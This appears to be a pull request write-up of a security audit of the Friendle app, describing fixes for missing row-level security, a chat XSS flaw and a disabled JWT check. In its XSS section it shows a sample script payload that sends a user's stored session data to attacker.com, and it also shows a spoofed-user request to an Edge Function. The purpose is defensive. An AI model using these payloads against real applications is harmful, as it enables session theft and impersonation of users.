# Security Audit & Critical Vulnerability Fixes

This PR addresses critical security vulnerabilities identified during a comprehensive security audit of the Friendle application.

---

## 📋 Summary

**Critical Vulnerabilities Fixed:**
1. ✅ Missing Row Level Security (RLS) policies on core tables
2. ✅ XSS vulnerability in message rendering
3. ✅ JWT verification disabled on client-callable Edge Function

**Security Impact:**
- Prevents unauthorized access to database tables via direct Supabase API calls
- Blocks JavaScript injection attacks that could steal tokens or access data
- Prevents user impersonation in Edge Function calls

---

## 🎯 What Was Fixed

### 1. Row Level Security (RLS) Policies ✅

**Problem:** Core tables had NO RLS policies, allowing any authenticated user to access ALL data.

**Fix:** Created comprehensive RLS policies using simplified, non-recursive approach:
- `profiles` - Users can read all profiles (needed for UI), update only own
- `circle_members` - Read all memberships (safe), modify only own
- `circles` - Read only circles user is member of
- `matches` - Read only matches from user's circles
- `events` - Read only events from user's circles
- `match_participants`, `event_participants` - Participate only in own
- `preferences` - Manage only own preferences
- `activities` - Read all (just templates), create for own circles
- `inactivity_warnings` - Read only own
- `muted_chats` - Manage only own

**Files:**
- `MIGRATION_add_rls_policies_all_tables.sql` - Initial attempt (had recursion bug)
- `MIGRATION_fix_infinite_recursion.sql` - First fix attempt (still had recursion)
- `MIGRATION_fix_recursion_complete.sql` - **FINAL FIX** (applied successfully)

**Note:** Infinite recursion occurred when policies referenced the same table they protected. Final solution uses simplified policies that avoid self-references while maintaining security.

### 2. XSS Vulnerability Fixed ✅

**Problem:** User messages rendered using `innerHTML` without sanitization.

**Attack Vector:**
```javascript
// Malicious user sends:
<script>fetch('https://attacker.com/steal', {
  method: 'POST',
  body: localStorage.getItem('friendle_user')
})</script>
```

**Fix:**
- Added `sanitizeHTML()` function that escapes all HTML special characters
- Updated `appendMessageToContainer()` to sanitize message content and sender names
- Updated `appendMessage()` to sanitize all user-generated content

**Files Changed:**
- `index.html:8572-8579` - New sanitization function
- `index.html:8645-8646` - Sanitize in appendMessageToContainer
- `index.html:8726-8729` - Sanitize in appendMessage

**Test Result:** ✅ Sending `<script>alert('XSS')</script>` displays as text, no execution

---

### 3. JWT Verification Enabled ✅

**Problem:** `stay-interested` Edge Function had `verify_jwt = false`, allowing user impersonation.

**Attack Scenario:**
```javascript
// Attacker spoofs any user:
await fetch('https://[project].supabase.co/functions/v1/stay-interested', {
  method: 'POST',
  body: JSON.stringify({
    matchId: 'target-match',
    profileId: 'victim-user-id'  // Can spoof anyone!
  })
});
```

**Fix:**
- Set `verify_jwt = true` in `supabase/config.toml`
- Added JWT verification in `stay-interested/index.ts`
- Validates Authorization header
- Verifies user identity from token
- Ensures `user.id === profileId` before allowing updates

**Files Changed:**
- `supabase/config.toml` - Enabled JWT verification
- `supabase/functions/stay-interested/index.ts` - Added auth validation logic

## 🧪 Security Testing Results

All tests performed after fixes:

| Test | Method | Result | Status |
|------|--------|--------|--------|
| **XSS Protection** | Sent `<script>alert('test')</script>` in chat | No popup, text sanitized | ✅ **PASS** |
| **Message Privacy** | Queried match_messages table | 78 messages from 5 active matches only | ✅ **PASS** |
| **Profile Update** | Attempted to update other user's profile | Blocked by RLS | ✅ **PASS** |
| **Circle Access** | Queried circles table | Shows 10 circles (see Known Issues) | ⚠️ **MINOR** |

---

## ⚠️ Known Issues

### Circle Visibility
**Issue:** Users can see names of circles they've LEFT (10 visible vs 3 current memberships)

**Impact:** Low - Users can see circle names they previously knew about

**Why Not Fixed:**
- Invite code feature queries circles by code before joining
- Fixing this would break invite validation
- Messages/events from old circles are still inaccessible (protected by separate RLS)
- Would require rewriting invite code feature to use Edge Function

**Mitigation:** Real sensitive data (messages, events, matches) is still protected

**Optional Fix:** `MIGRATION_fix_circle_access.sql` (NOT APPLIED - breaks invite codes)

---

## 📦 Files Changed

### New Migrations (Run in Supabase SQL Editor)
- ✅ `MIGRATION_add_rls_policies_all_tables.sql` - Initial RLS (had bug)
- ✅ `MIGRATION_fix_infinite_recursion.sql` - First fix (still had bug)
- ✅ **`MIGRATION_fix_recursion_complete.sql`** - **APPLY THIS ONE**
- ⚠️ `MIGRATION_fix_circle_access.sql` - Optional, not recommended

### Code Changes
- ✅ `index.html` - XSS sanitization fixes
- ✅ `supabase/config.toml` - JWT verification enabled
- ✅ `supabase/functions/stay-interested/index.ts` - Auth validation

### Documentation
- 📄 `SECURITY_AUDIT_REPORT.md` - Comprehensive security audit findings
- 📄 `RLS_TESTING_GUIDE.md` - Testing procedures for RLS policies

---

## 🚀 Deployment Instructions

### Step 1: Apply RLS Migration
```sql
-- In Supabase SQL Editor, run:
-- MIGRATION_fix_recursion_complete.sql

-- Verify policies created:
SELECT tablename, policyname, cmd
FROM pg_policies
WHERE tablename IN ('profiles', 'circle_members', 'activities')
ORDER BY tablename;

-- Should see 10 policies across these tables
```

### Step 2: Deploy Frontend Changes
```bash
# XSS fixes are in index.html
# Deploy to Vercel/hosting as normal
git pull origin claude/security-audit-friendle-011CURGCwrrtU3e4g3wcfzeR
# Deploy to production
```

### Step 3: Deploy Edge Functions
```bash
# Redeploy stay-interested function with JWT verification
supabase functions deploy stay-interested

# Or via Supabase Dashboard → Edge Functions → Redeploy
```

### Step 4: Test in Production
- [ ] Login works
- [ ] Can send messages (no XSS)
- [ ] Can view circles
- [ ] Can join/leave circles
- [ ] Stay interested button works

## 🔒 Security Posture - Before vs After

| Vulnerability | Before | After |
|---------------|--------|-------|
| **Unauthorized DB Access** | ❌ Any user can read ALL tables | ✅ RLS enforces access control |
| **XSS Attacks** | ❌ Scripts execute in chat | ✅ All input sanitized |
| **User Impersonation** | ❌ Can spoof any user in Edge Functions | ✅ JWT verified, user validated |
| **Profile Hijacking** | ❌ Can update any profile | ✅ Can only update own |
| **Message Snooping** | ❌ Can read all messages | ✅ Only see own chats |
